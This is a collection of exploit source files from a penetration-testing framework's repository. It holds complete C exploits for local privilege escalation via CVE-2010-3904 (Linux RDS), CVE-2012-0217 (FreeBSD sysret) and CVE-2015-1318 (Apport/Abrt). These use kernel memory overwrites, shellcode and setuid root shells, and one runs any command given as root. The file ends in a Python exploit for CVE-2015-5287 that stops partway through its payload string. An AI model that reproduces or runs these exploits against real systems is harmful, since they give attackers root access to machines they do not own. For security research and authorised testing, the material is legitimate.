{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/cve-2010-3904/rds-fail.c", "content": "// source: http://www.vsecurity.com/resources/advisory/20101019-1/\r\n\r\n/* \r\n * Linux Kernel <= 2.6.36-rc8 RDS privilege escalation exploit\r\n * CVE-2010-3904\r\n * by Dan Rosenberg <drosenberg@vsecurity.com>\r\n *\r\n * Copyright 2010 Virtual Security Research, LLC\r\n *\r\n * The handling functions for sending and receiving RDS messages\r\n * use unchecked __copy_*_user_inatomic functions without any\r\n * access checks on user-provided pointers.  As a result, by\r\n * passing a kernel address as an iovec base address in recvmsg-style\r\n * calls, a local user can overwrite arbitrary kernel memory, which\r\n * can easily be used to escalate privileges to root.  Alternatively,\r\n * an arbitrary kernel read can be performed via sendmsg calls.\r\n *\r\n * This exploit is simple - it resolves a few kernel symbols,\r\n * sets the security_ops to the default structure, then overwrites\r\n * a function pointer (ptrace_traceme) in that structure to point\r\n * to the payload.  After triggering the payload, the original\r\n * value is restored.  Hard-coding the offset of this function\r\n * pointer is a bit inelegant, but I wanted to keep it simple and\r\n * architecture-independent (i.e. no inline assembly).\r\n *\r\n * The vulnerability is yet another example of why you shouldn't\r\n * allow loading of random packet families unless you actually\r\n * need them.\r\n *\r\n * Greets to spender, kees, taviso, hawkes, team lollerskaters,\r\n * joberheide, bla, sts, and VSR\r\n *\r\n */\r\n\r\n// Modified for Metasploit (see comments marked 'msf note')\r\n\r\n#include <stdio.h>\r\n#include <unistd.h>\r\n#include <stdlib.h>\r\n#include <fcntl.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <errno.h>\r\n#include <string.h>\r\n#include <sys/ptrace.h>\r\n#include <sys/utsname.h>\r\n\r\n#define RECVPORT 5555 \r\n#define SENDPORT 6666\r\n\r\nint prep_sock(int port)\r\n{\r\n\t\r\n\tint s, ret;\r\n\tstruct sockaddr_in addr;\r\n\r\n\ts = socket(PF_RDS, SOCK_SEQPACKET, 0);\r\n\r\n\tif(s < 0) {\r\n\t\tprintf(\"[*] Could not open socket.\\n\");\r\n\t\texit(-1);\r\n\t}\r\n\t\r\n\tmemset(&addr, 0, sizeof(addr));\r\n\r\n\taddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\r\n\taddr.sin_family = AF_INET;\r\n\taddr.sin_port = htons(port);\r\n\r\n\tret = bind(s, (struct sockaddr *)&addr, sizeof(addr));\r\n\r\n\tif(ret < 0) {\r\n\t\tprintf(\"[*] Could not bind socket.\\n\");\r\n\t\texit(-1);\r\n\t}\r\n\r\n\treturn s;\r\n\r\n}\r\n\r\nvoid get_message(unsigned long address, int sock)\r\n{\r\n\r\n\trecvfrom(sock, (void *)address, sizeof(void *), 0,\r\n\t\t NULL, NULL);\r\n\r\n}\r\n\r\nvoid send_message(unsigned long value, int sock)\r\n{\r\n\t\r\n\tint size, ret;\r\n\tstruct sockaddr_in recvaddr;\r\n\tstruct msghdr msg;\r\n\tstruct iovec iov;\r\n\tunsigned long buf;\r\n\t\r\n\tmemset(&recvaddr, 0, sizeof(recvaddr));\r\n\r\n\tsize = sizeof(recvaddr);\r\n\r\n\trecvaddr.sin_port = htons(RECVPORT);\r\n\trecvaddr.sin_family = AF_INET;\r\n\trecvaddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\r\n\r\n\tmemset(&msg, 0, sizeof(msg));\r\n\t\r\n\tmsg.msg_name = &recvaddr;\r\n\tmsg.msg_namelen = sizeof(recvaddr);\r\n\tmsg.msg_iovlen = 1;\r\n\t\r\n\tbuf = value;\r\n\r\n\tiov.iov_len = sizeof(buf);\r\n\tiov.iov_base = &buf;\r\n\r\n\tmsg.msg_iov = &iov;\r\n\r\n\tret = sendmsg(sock, &msg, 0);\r\n\tif(ret < 0) {\r\n\t\tprintf(\"[*] Something went wrong sending.\\n\");\r\n\t\texit(-1);\r\n\t}\r\n}\r\n\r\nvoid write_to_mem(unsigned long addr, unsigned long value, int sendsock, int recvsock)\r\n{\r\n\r\n\tif(!fork()) {\r\n\t\t\tsleep(1);\r\n\t\t\tsend_message(value, sendsock);\r\n\t\t\texit(1);\r\n\t}\r\n\telse {\r\n\t\tget_message(addr, recvsock);\r\n\t\twait(NULL);\r\n\t}\r\n\r\n}\r\n\r\ntypedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);\r\ntypedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);\r\n_commit_creds commit_creds;\r\n_prepare_kernel_cred prepare_kernel_cred;\r\n\r\nint __attribute__((regparm(3)))\r\ngetroot(void * file, void * vma)\r\n{\r\n\r\n\tcommit_creds(prepare_kernel_cred(0));\r\n\treturn -1;\t\r\n\r\n}\r\n\r\n/* thanks spender... */\r\nunsigned long get_kernel_sym(char *name)\r\n{\r\n\tFILE *f;\r\n\tunsigned long addr;\r\n\tchar dummy;\r\n\tchar sname[512];\r\n\tstruct utsname ver;\r\n\tint ret;\r\n\tint rep = 0;\r\n\tint oldstyle = 0;\r\n\r\n\tf = fopen(\"/proc/kallsyms\", \"r\");\r\n\tif (f == NULL) {\r\n\t\tf = fopen(\"/proc/ksyms\", \"r\");\r\n\t\tif (f == NULL)\r\n\t\t\tgoto fallback;\r\n\t\toldstyle = 1;\r\n\t}\r\n\r\nrepeat:\r\n\tret = 0;\r\n\twhile(ret != EOF) {\r\n\t\tif (!oldstyle)\r\n\t\t\tret = fscanf(f, \"%p %c %s\\n\", (void **)&addr, &dummy, sname);\r\n\t\telse {\r\n\t\t\tret = fscanf(f, \"%p %s\\n\", (void **)&addr, sname);\r\n\t\t\tif (ret == 2) {\r\n\t\t\t\tchar *p;\r\n\t\t\t\tif (strstr(sname, \"_O/\") || strstr(sname, \"_S.\"))\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\tp = strrchr(sname, '_');\r\n\t\t\t\tif (p > ((char *)sname + 5) && !strncmp(p - 3, \"smp\", 3)) {\r\n\t\t\t\t\tp = p - 4;\r\n\t\t\t\t\twhile (p > (char *)sname && *(p - 1) == '_')\r\n\t\t\t\t\t\tp--;\r\n\t\t\t\t\t*p = '\\0';\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\tif (ret == 0) {\r\n\t\t\tfscanf(f, \"%s\\n\", sname);\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (!strcmp(name, sname)) {\r\n\t\t\tfprintf(stdout, \" [+] Resolved %s to %p%s\\n\", name, (void *)addr, rep ? \" (via System.map)\" : \"\");\r\n\t\t\tfclose(f);\r\n\t\t\treturn addr;\r\n\t\t}\r\n\t}\r\n\r\n\tfclose(f);\r\n\tif (rep)\r\n\t\treturn 0;\r\nfallback:\r\n\t/* didn't find the symbol, let's retry with the System.map\r\n\t   dedicated to the pointlessness of Russell Coker's SELinux\r\n\t   test machine (why does he keep upgrading the kernel if\r\n\t   \"all necessary security can be provided by SE Linux\"?)\r\n\t*/\r\n\tuname(&ver);\r\n\tif (strncmp(ver.release, \"2.6\", 3))\r\n\t\toldstyle = 1;\r\n\tsprintf(sname, \"/boot/System.map-%s\", ver.release);\r\n\tf = fopen(sname, \"r\");\r\n\tif (f == NULL)\r\n\t\treturn 0;\r\n\trep = 1;\r\n\tgoto repeat;\r\n}\r\n\r\nint main(int argc, char * argv[])\r\n{\r\n\tunsigned long sec_ops, def_ops, cap_ptrace, target;\r\n\tint sendsock, recvsock;\r\n\tstruct utsname ver;\r\n\r\n\tprintf(\"[*] Linux kernel >= 2.6.30 RDS socket exploit\\n\");\r\n\tprintf(\"[*] by Dan Rosenberg\\n\");\r\n\r\n\tuname(&ver);\r\n\r\n\tif(strncmp(ver.release, \"2.6.3\", 5)) {\r\n\t\tprintf(\"[*] Your kernel is not vulnerable.\\n\");\r\n\t\treturn -1;\r\n\t}\t\r\n\r\n\t/* Resolve addresses of relevant symbols */\r\n\tprintf(\"[*] Resolving kernel addresses...\\n\");\r\n\tsec_ops = get_kernel_sym(\"security_ops\");\r\n\tdef_ops = get_kernel_sym(\"default_security_ops\");\r\n\tcap_ptrace = get_kernel_sym(\"cap_ptrace_traceme\");\r\n\tcommit_creds = (_commit_creds) get_kernel_sym(\"commit_creds\");\r\n\tprepare_kernel_cred = (_prepare_kernel_cred) get_kernel_sym(\"prepare_kernel_cred\");\r\n\r\n\tif(!sec_ops || !def_ops || !cap_ptrace || !commit_creds || !prepare_kernel_cred) {\r\n\t\tprintf(\"[*] Failed to resolve kernel symbols.\\n\");\r\n\t\treturn -1;\r\n\t}\r\n\r\n\t/* Calculate target */\r\n\ttarget = def_ops + sizeof(void *) + ((11 + sizeof(void *)) & ~(sizeof(void *) - 1));\r\n\r\n\tsendsock = prep_sock(SENDPORT);\r\n\trecvsock = prep_sock(RECVPORT);\r\n\r\n\t/* Reset security ops */\r\n\tprintf(\"[*] Overwriting security ops...\\n\");\r\n\twrite_to_mem(sec_ops, def_ops, sendsock, recvsock);\r\n\r\n\t/* Overwrite ptrace_traceme security op fptr */\r\n\tprintf(\"[*] Overwriting function pointer...\\n\");\r\n\twrite_to_mem(target, (unsigned long)&getroot, sendsock, recvsock);\r\n\r\n\t/* Trigger the payload */\r\n\tprintf(\"[*] Triggering payload...\\n\");\r\n\tptrace(PTRACE_TRACEME, 1, NULL, NULL);\r\n\t\r\n\t/* Restore the ptrace_traceme security op */\r\n\tprintf(\"[*] Restoring function pointer...\\n\");\r\n\twrite_to_mem(target, cap_ptrace, sendsock, recvsock);\r\n\r\n\tif(getuid()) {\r\n\t\tprintf(\"[*] Exploit failed to get root.\\n\");\r\n\t\treturn -1;\r\n\t}\r\n\r\n\tprintf(\"[*] Got root!\\n\");\r\n\t// msf note: modified to execute argv[1]\r\n\t//execl(\"/bin/sh\", \"sh\", NULL);\r\n\tsystem(argv[1]);\r\n\r\n}\r\n", "timestamp": "2025-10-24T23:42:01.386366"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/cve-2012-0217/sysret.c", "content": "// CVE-2012-0217 Intel sysret exploit -- iZsh (izsh at fail0verflow.com)\n// Copyright 2012 all right reserved, not for commercial uses, bitches\n// Infringement Punishment: Monkeys coming out of your ass Bruce Almighty style.\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <unistd.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/utsname.h>\n#include <machine/cpufunc.h>\n#define _WANT_UCRED\n#include <sys/proc.h>\n#include <machine/segments.h>\n#include <sys/param.h>\n#include <sys/linker.h>\n\nuintptr_t Xofl_ptr, Xbnd_ptr, Xill_ptr, Xdna_ptr, Xpage_ptr, Xfpu_ptr, Xalign_ptr, Xmchk_ptr, Xxmm_ptr;\n\nstruct gate_descriptor * sidt()\n{\n\tstruct region_descriptor idt;\n\n\tasm (\"sidt %0\": \"=m\"(idt));\n\n\treturn (struct gate_descriptor*)idt.rd_base;\n} \n\nu_long get_symaddr(char *symname)\n{\n\tstruct kld_sym_lookup ksym;\n\n\tksym.version = sizeof (ksym);\n\tksym.symname = symname;\n\n\tif (kldsym(0, KLDSYM_LOOKUP, &ksym) < 0) {\n\t\tperror(\"kldsym\");\n\t\texit(1);\n\t}\n\tprintf(\"    [+] Resolved %s to %#lx\\n\", ksym.symname, ksym.symvalue);\n\treturn ksym.symvalue;\n}\n\n// Code taken from amd64/amd64/machdep.c\nvoid setidt(struct gate_descriptor *idt, int idx, uintptr_t func, int typ, int dpl, int ist)\n{\n\tstruct gate_descriptor *ip;\n\n\tip = idt + idx;\n\tip->gd_looffset = func;\n\tip->gd_selector = GSEL(GCODE_SEL, SEL_KPL);\n\tip->gd_ist = ist;\n\tip->gd_xx = 0;\n\tip->gd_type = typ;\n\tip->gd_dpl = dpl;\n\tip->gd_p = 1;\n\tip->gd_hioffset = func>>16;\n}\n\nvoid shellcode()\n{\n\t// Actually we dont really need to spawn a shell since we\n\t// changed our whole cred struct.\n\t// Just exit...\n\tprintf(\"[*] Got root!\\n\");\n\texit(0);\n}\n\nvoid kernelmodepayload()\n{\n\tstruct thread *td;\n\tstruct ucred *cred;\n\n\t// We need to restore/recover whatever we smashed\n\t// We inititalized rsp to idt[14] + 10*8, i.e. idt[19] (see trigger())\n\t// The #GP exception frame writes 6*64bit registers, i.e. it overwrites\n\t// idt[18], idt[17] and idt[16]\n\t// thus overall we have:\n\t// - idt[18], idt[17] and idt[16] are trashed\n\t// - tf_addr -> overwrites the 64bit-LSB of idt[15]\n\t// - tf_trapno -> overwrites Target Offset[63:32] of idt[14]\n\t// - rdi -> overwrites the 64bit-LSB of idt[7]\n\t// - #PF exception frame overwrites idt[6], idt[5] and idt[4]\n\tstruct gate_descriptor *idt = sidt();\n\tsetidt(idt, IDT_OF, Xofl_ptr, SDT_SYSIGT, SEL_KPL, 0); // 4\n\tsetidt(idt, IDT_BR, Xbnd_ptr, SDT_SYSIGT, SEL_KPL, 0); // 5\n\tsetidt(idt, IDT_UD, Xill_ptr, SDT_SYSIGT, SEL_KPL, 0); // 6\n\tsetidt(idt, IDT_NM, Xdna_ptr, SDT_SYSIGT, SEL_KPL, 0); // 7\n\tsetidt(idt, IDT_PF, Xpage_ptr, SDT_SYSIGT, SEL_KPL, 0); // 14\n\tsetidt(idt, IDT_MF, Xfpu_ptr, SDT_SYSIGT, SEL_KPL, 0); // 15\n\tsetidt(idt, IDT_AC, Xalign_ptr, SDT_SYSIGT, SEL_KPL, 0); // 16\n\tsetidt(idt, IDT_MC, Xmchk_ptr, SDT_SYSIGT, SEL_KPL, 0); // 17\n\tsetidt(idt, IDT_XF, Xxmm_ptr, SDT_SYSIGT, SEL_KPL, 0); // 18\n\n\t// get the thread pointer\n\tasm (\"mov %%gs:0, %0\" : \"=r\"(td));\n\n\t// The Dark Knight Rises\n\tcred = td->td_proc->p_ucred;\n\tcred->cr_uid = cred->cr_ruid = cred->cr_rgid = 0;\n\tcred->cr_groups[0] = 0;\n\n\t// return to user mode to spawn the shell\n\tasm (\"swapgs; sysretq;\" :: \"c\"(shellcode)); // store the shellcode addr to rcx\n}\n\n#define TRIGGERCODESIZE 20\n#define TRAMPOLINECODESIZE 18\n\nvoid trigger()\n{\n\tprintf(\"[*] Setup...\\n\");\n\t// Allocate one page just before the non-canonical address\n\tprintf(\"    [+] Trigger code...\\n\");\n\tuint64_t pagesize = getpagesize();\n\tuint8_t * area = (uint8_t*)((1ULL << 47) - pagesize);\n\tarea = mmap(area, pagesize,\n\t\tPROT_READ | PROT_WRITE | PROT_EXEC,\n\t\tMAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0);\n\tif (area == MAP_FAILED) {\n\t\tperror(\"mmap (trigger)\");\n\t\texit(1);\n\t}\n\n\t// Copy the trigger code at the end of the page\n\t// such that the syscall instruction is at its\n\t// boundary\n\tchar triggercode[] =\n\t\t\"\\xb8\\x18\\x00\\x00\\x00\" // mov rax, 24; #getuid\n\t\t\"\\x48\\x89\\xe3\" // mov rbx, rsp; save the user's stack for later\n\t\t\"\\x48\\xbc\\xbe\\xba\\xfe\\xca\\xde\\xc0\\xad\\xde\" // mov rsp, 0xdeadc0decafebabe\n\t\t\"\\x0f\\x05\"; // syscall\n\n\tuint8_t * trigger_addr = area + pagesize - TRIGGERCODESIZE;\n\tmemcpy(trigger_addr, triggercode, TRIGGERCODESIZE);\n\n\t// There are two outcomes given a target rsp:\n\t// - if rsp can't be written to, a double fault is triggered\n\t//   (Xdblfault defined in sys/amd64/amd64/exception.S)\n\t//   and the exception frame is pushed to a special stack\n\t// - otherwise a #GP is triggered\n\t//\t (Xprot defined in sys/amd64/amd64/exception.S)\n\t//   and the exception frame is pushed to [rsp]\n\t//\n\t// In the latter case, trouble is... #GP triggers a page fault\n\t// (Xpage):\n\t//  IDTVEC(prot)\n\t//  \tsubq\t$TF_ERR,%rsp\n\t//  [1]\tmovl\t$T_PROTFLT,TF_TRAPNO(%rsp)\n\t//  [2]\tmovq\t$0,TF_ADDR(%rsp)\n\t//  [3]\tmovq\t%rdi,TF_RDI(%rsp)\t/* free up a GP register */\n\t//  \tleaq\tdoreti_iret(%rip),%rdi\n\t//  \tcmpq\t%rdi,TF_RIP(%rsp)\n\t//  \tje\t1f\t\t\t/* kernel but with user gsbase!! */\n\t//  [4]\ttestb\t$SEL_RPL_MASK,TF_CS(%rsp) /* Did we come from kernel? */\n\t//  \tjz\t2f\t\t\t/* already running with kernel GS.base */\n\t//  1:\tswapgs\n\t//  2:\tmovq\tPCPU(CURPCB),%rdi [5]\n\t//\n\t// [4] sets the Z flag because we come from the kernel (while executing sysret)\n\t// and we therefore skip swapgs. But GS is in fact the user GS.base! Indeed\n\t// it was restored just before calling sysret...\n\t// Thus, [5] triggers a pagefault while trying to access gs:data\n\t// If we don't do anything we'll eventually doublefault, tripplefault etc. and crash\n\t//\n\t// We therefore need a way: (1) to recover from the GP, (2) to clean\n\t// any mess we did. Both could be solved if we can get get an arbitrary\n\t// code execution by the time we reach [5] (NB: this is not mandatory, we could\n\t// get the code execution later down the fault trigger chain)\n\t//\n\t// So... here is the idea: wouldn't it be nice if we could overwrite the\n\t// page fault handler's address and therefore get code execution when [5]\n\t// triggers the #PF?\n\t//\n\t// For reference:\n\t// Gate descriptor:\n\t// +0: Target Offset[15:0] | Target Selector\n\t// +4: Some stuff | Target Offset[31:16]\n\t// +8: Target Offset[63:32]\n\t// +12: Stuff\n\t//\n\t// and from include/frame.h:\n\t//  struct trapframe {\n\t//  \tregister_t\ttf_rdi;\n\t//  \tregister_t\ttf_rsi;\n\t//  \tregister_t\ttf_rdx;\n\t//  \tregister_t\ttf_rcx;\n\t//  \tregister_t\ttf_r8;\n\t//  \tregister_t\ttf_r9;\n\t//  \tregister_t\ttf_rax;\n\t//  \tregister_t\ttf_rbx;\n\t//  \tregister_t\ttf_rbp;\n\t//  \tregister_t\ttf_r10;\n\t//  \tregister_t\ttf_r11;\n\t//  \tregister_t\ttf_r12;\n\t//  \tregister_t\ttf_r13;\n\t//  \tregister_t\ttf_r14;\n\t//  \tregister_t\ttf_r15;\n\t//  \tuint32_t\ttf_trapno;\n\t//  \tuint16_t\ttf_fs;\n\t//  \tuint16_t\ttf_gs;\n\t//  \tregister_t\ttf_addr;\n\t//  \tuint32_t\ttf_flags;\n\t//  \tuint16_t\ttf_es;\n\t//  \tuint16_t\ttf_ds;\n\t//  \t/* below portion defined in hardware */\n\t//  \tregister_t\ttf_err;\n\t//  \tregister_t\ttf_rip;\n\t//  \tregister_t\ttf_cs;\n\t//  \tregister_t\ttf_rflags;\n\t//  \tregister_t\ttf_rsp;\n\t//  \tregister_t\ttf_ss;\n\t//  };\n\t//\n\t// When the exception is triggered, the hardware pushes\n\t// ss, rsp, rflags, cs, rip and err\n\t//\n\t// We can see that [1], [2] and [3] write to the stack\n\t// [3] is fully user-controlled through rdi, so we could try to align\n\t// rsp such that [3] overwrites the offset address\n\t//\n\t// The trouble is... rsp is 16byte aligned for exceptions. We can\n\t// therefore only overwrite the first 32-LSB of the offset address\n\t// (check how rdi is 16byte aligned in this trapframe)\n\t//\n\t// [2] writes 0 to tf_addr which is also 16byte aligned. So no dice.\n\t// That leaves us with [1] which writes T_PROTFLT (0x9) to tf_trapno\n\t// and tf_trapno is 16byte aligned + 8!\n\t// This enables us to set Target Offset[63:32] to 0x9\n\t//\n\t// We set rsp to &idt[14] + 10 * 8 (to align tf_trapno with Offset[63:32])\n\t*(uint64_t*)(trigger_addr + 10) = (uint64_t)(((uint8_t*)&sidt()[14]) + 10 * 8);\n\t// Hence, the #PF handler's address is now 0x9WWXXYYZZ\n\t// Furthermore, WWXXYYZZ is known since we can get (see get_symaddr()) the #PF's address\n\t// Thus, the idea is to setup a trampoline code at 0x9WWXXYYZZ which does\n\t// some setup and jump to our kernel mode code\n\tprintf(\"    [+] Trampoline code...\\n\");\n\tchar trampolinecode[] =\n\t\t\"\\x0f\\x01\\xf8\" // swapgs; switch back to the kernel's GS.base\n\t\t\"\\x48\\x89\\xdc\" // mov rsp, rbx; restore rsp, it's enough to use the user's stack\n\t\t\"\\x48\\xb8\\xbe\\xba\\xfe\\xca\\xde\\xc0\\xad\\xde\" // mov rax, 0xdeadc0decafebabe\n\t\t\"\\xff\\xe0\"; // jmp rax\n\n\tuint8_t * trampoline = (uint8_t*)(0x900000000 | (Xpage_ptr & 0xFFFFFFFF));\n\tsize_t trampoline_allocsize = pagesize;\n\t// We round the address to the PAGESIZE for the allocation\n\t// Not enough space for the trampoline code ?\n\tif ((uint8_t*)((uint64_t)trampoline & ~(pagesize-1)) + pagesize < trampoline + TRAMPOLINECODESIZE)\n\t\ttrampoline_allocsize += pagesize;\n\tif (mmap((void*)((uint64_t)trampoline & ~(pagesize-1)), trampoline_allocsize,\n\t\tPROT_READ | PROT_WRITE | PROT_EXEC,\n\t\tMAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0) == MAP_FAILED)\n\t{\n\t\tperror(\"mmap (trampoline)\");\n\t\texit(1);\n\t}\n\tmemcpy(trampoline, trampolinecode, TRAMPOLINECODESIZE);\n\t*(uint64_t*)(trampoline + 8) = (uint64_t)kernelmodepayload;\n\t// Call it\n\tprintf(\"[*] Fire in the hole!\\n\");\n\t((void (*)())trigger_addr)();\n}\n\ntypedef struct validtarget\n{\n\tchar * sysname;\n\tchar * release;\n\tchar * machine;\n} validtarget_t;\n\nint validate_target(char * sysname, char * release, char * machine)\n{\n\tvalidtarget_t targets[] = {\n\t\t{ \"FreeBSD\", \"8.3-RELEASE\", \"amd64\" },\n\t\t{ \"FreeBSD\", \"9.0-RELEASE\", \"amd64\" },\n\t\t{ 0, 0, 0 }\n\t};\n\n\tint found = 0;\n\tint i = 0;\n\n\twhile (!found && targets[i].sysname) {\n\t\tfound = !strcmp(targets[i].sysname, sysname)\n\t\t\t&& !strcmp(targets[i].release, release)\n\t\t\t&& !strcmp(targets[i].machine, machine);\n\t\t++i;\n\t}\n\treturn found;\n}\n\nvoid get_cpu_vendor(char * cpu_vendor)\n{\n\tu_int regs[4];\n\n\tdo_cpuid(0, regs);\n   ((u_int *)cpu_vendor)[0] = regs[1];\n   ((u_int *)cpu_vendor)[1] = regs[3];\n   ((u_int *)cpu_vendor)[2] = regs[2];\n   cpu_vendor[12] = '\\0';\n}\n\nint is_intel()\n{\n\tchar cpu_vendor[13];\n\n\tget_cpu_vendor(cpu_vendor);\n\treturn !strcmp(cpu_vendor, \"GenuineIntel\");\n}\n\nint main(int argc, char *argv[])\n{\n\tprintf(\"CVE-2012-0217 Intel sysret exploit -- iZsh (izsh at fail0verflow.com)\\n\\n\");\n\n\tprintf(\"[*] Retrieving host information...\\n\");\n\tchar cpu_vendor[13];\n\tget_cpu_vendor(cpu_vendor);\n\tstruct utsname ver;\n\tuname(&ver);\n\tprintf(\"    [+] CPU: %s\\n\", cpu_vendor);\n\tprintf(\"    [+] sysname: %s\\n\", ver.sysname);\n\tprintf(\"    [+] release: %s\\n\", ver.release);\n\tprintf(\"    [+] version: %s\\n\", ver.version);\n\tprintf(\"    [+] machine: %s\\n\", ver.machine);\n\tprintf(\"[*] Validating target OS and version...\\n\");\n\tif (!is_intel() || !validate_target(ver.sysname, ver.release, ver.machine)) {\n\t\tprintf(\"    [+] NOT Vulnerable :-(\\n\");\n\t\texit(1);\n\t} else\n\t\tprintf(\"    [+] Vulnerable :-)\\n\");\n\t// Prepare the values we'll need to restore the kernel to a stable state\n\tprintf(\"[*] Resolving kernel addresses...\\n\");\n\tXofl_ptr = (uintptr_t)get_symaddr(\"Xofl\");\n\tXbnd_ptr = (uintptr_t)get_symaddr(\"Xbnd\");\n\tXill_ptr = (uintptr_t)get_symaddr(\"Xill\");\n\tXdna_ptr = (uintptr_t)get_symaddr(\"Xdna\");\n\tXpage_ptr = (uintptr_t)get_symaddr(\"Xpage\");\n\tXfpu_ptr = (uintptr_t)get_symaddr(\"Xfpu\");\n\tXalign_ptr = (uintptr_t)get_symaddr(\"Xalign\");\n\tXmchk_ptr = (uintptr_t)get_symaddr(\"Xmchk\");\n\tXxmm_ptr = (uintptr_t)get_symaddr(\"Xxmm\");\n\t// doeet!\n\ttrigger();\n\treturn 0;\n}\n\n", "timestamp": "2025-10-24T23:42:01.704986"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/cve-2015-1318/newpid.c", "content": "#define _GNU_SOURCE\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <signal.h>\n#include <err.h>\n#include <syslog.h>\n#include <sched.h>\n#include <linux/sched.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <sys/wait.h>\n \n//\n// Apport/Abrt Vulnerability Demo Exploit.\n//\n//  Apport: CVE-2015-1318\n//  Abrt:   CVE-2015-1862\n// \n//   -- taviso@cmpxchg8b.com, April 2015.\n//\n// $ gcc -static newpid.c\n// $ ./a.out\n// uid=0(root) gid=0(root) groups=0(root)\n// sh-4.3# exit\n// exit\n//\n// Hint: To get libc.a,\n//  yum install glibc-static or apt-get install libc6-dev\n//\n\n//\n// Modified for Metasploit. Original exploit:\n// - https://www.exploit-db.com/exploits/36746/\n//\n \nint main(int argc, char **argv)\n{\n    int status;\n    pid_t wrapper;\n    pid_t init;\n    pid_t subprocess;\n    unsigned i;\n\n    // If we're root, then we've convinced the core handler to run us,\n    // so create a setuid root executable that can be used outside the chroot.\n    if (getuid() == 0) {\n        if (chown(\"sh\", 0, 0) != 0)\n            exit(EXIT_FAILURE);\n \n        if (chmod(\"sh\", 04755) != 0)\n            exit(EXIT_FAILURE);\n \n        return EXIT_SUCCESS;\n    }\n \n    // If I'm not root, but euid is 0, then the exploit worked and we can spawn\n    // a shell and cleanup.\n    if (setuid(0) == 0) {\n        system(\"id\");\n        system(\"rm -rf exploit\");\n        execlp(\"sh\", \"sh\", NULL);\n \n        // Something went wrong.\n        err(EXIT_FAILURE, \"failed to spawn root shell, but exploit worked\");\n    }\n \n    // It looks like the exploit hasn't run yet, so create a chroot.\n    if (mkdir(\"exploit\", 0755) != 0\n     || mkdir(\"exploit/usr\", 0755) != 0\n     || mkdir(\"exploit/usr/share\", 0755) != 0\n     || mkdir(\"exploit/usr/share/apport\", 0755) != 0\n     || mkdir(\"exploit/usr/libexec\", 0755) != 0) {\n        err(EXIT_FAILURE, \"failed to create chroot directory\");\n    }\n \n    // Create links to the exploit locations we need.\n    if (link(*argv, \"exploit/sh\") != 0\n     || link(*argv, \"exploit/usr/share/apport/apport\") != 0        // Ubuntu\n     || link(*argv, \"exploit/usr/libexec/abrt-hook-ccpp\") != 0) {  // Fedora\n        err(EXIT_FAILURE, \"failed to create required hard links\");\n    }\n \n    // Create a subprocess so we don't enter the new namespace.\n    if ((wrapper = fork()) == 0) {\n \n        // In the child process, create a new pid and user ns. The pid\n        // namespace is only needed on Ubuntu, because they check for %P != %p\n        // in their core handler. On Fedora, just a user ns is sufficient.\n        if (unshare(CLONE_NEWPID | CLONE_NEWUSER) != 0)\n            err(EXIT_FAILURE, \"failed to create new namespace\");\n \n        // Create a process in the new namespace.\n        if ((init = fork()) == 0) {\n \n            // Init (pid 1) signal handling is special, so make a subprocess to\n            // handle the traps.\n            if ((subprocess = fork()) == 0) {\n                // Change /proc/self/root, which we can do as we're privileged\n                // within the new namepace.\n                if (chroot(\"exploit\") != 0) {\n                    err(EXIT_FAILURE, \"chroot didnt work\");\n                }\n \n                // Now trap to get the core handler invoked.\n                __builtin_trap();\n \n                // Shouldn't happen, unless user is ptracing us or something.\n                err(EXIT_FAILURE, \"coredump failed, were you ptracing?\");\n            }\n \n            // If the subprocess exited with an abnormal signal, then everything worked.\n            if (waitpid(subprocess, &status, 0) == subprocess)    \n                return WIFSIGNALED(status)\n                        ? EXIT_SUCCESS\n                        : EXIT_FAILURE;\n \n            // Something didn't work.\n            return EXIT_FAILURE;\n        }\n \n        // The new namespace didn't work.\n        if (waitpid(init, &status, 0) == init)\n            return WIFEXITED(status) && WEXITSTATUS(status) == EXIT_SUCCESS\n                    ? EXIT_SUCCESS\n                    : EXIT_FAILURE;\n \n        // Waitpid failure.\n        return EXIT_FAILURE;\n    }\n \n    // If the subprocess returned sccess, the exploit probably worked,\n    // reload with euid zero.\n    if (waitpid(wrapper, &status, 0) == wrapper) {\n        // All done, spawn root shell.\n        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {\n            execl(*argv, \"w00t\", NULL);\n        }\n    }\n \n    // Unknown error.\n    errx(EXIT_FAILURE, \"unexpected result, cannot continue\");\n}\n", "timestamp": "2025-10-24T23:42:02.376478"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/cve-2015-5287/sosreport-rhel7.py", "content": "#!/usr/bin/python\n# CVE-2015-5287 (?)\n# abrt/sosreport RHEL 7.0/7.1 local root\n# rebel 09/2015\n\n# [user@localhost ~]$ python sosreport-rhel7.py\n# crashing pid 19143\n# waiting for dump directory\n# dump directory:  /var/tmp/abrt/ccpp-2015-11-30-19:41:13-19143\n# waiting for sosreport directory\n# sosreport:  sosreport-localhost.localdomain-20151130194114\n# waiting for tmpfiles\n# tmpfiles:  ['tmpurfpyY', 'tmpYnCfnQ']\n# moving directory\n# moving tmpfiles\n# tmpurfpyY -> tmpurfpyY.old\n# tmpYnCfnQ -> tmpYnCfnQ.old\n# waiting for sosreport to finish (can take several minutes)........................................done\n# success\n# bash-4.2# id\n# uid=0(root) gid=1000(user) groups=0(root),1000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\n# bash-4.2# cat /etc/redhat-release \n# Red Hat Enterprise Linux Server release 7.1 (Maipo)\n\nimport os,sys,glob,time,sys,socket\n\npayload = \"#!/bin/sh\\ncp /bin/sh /tmp/sh\\nchmod 6755 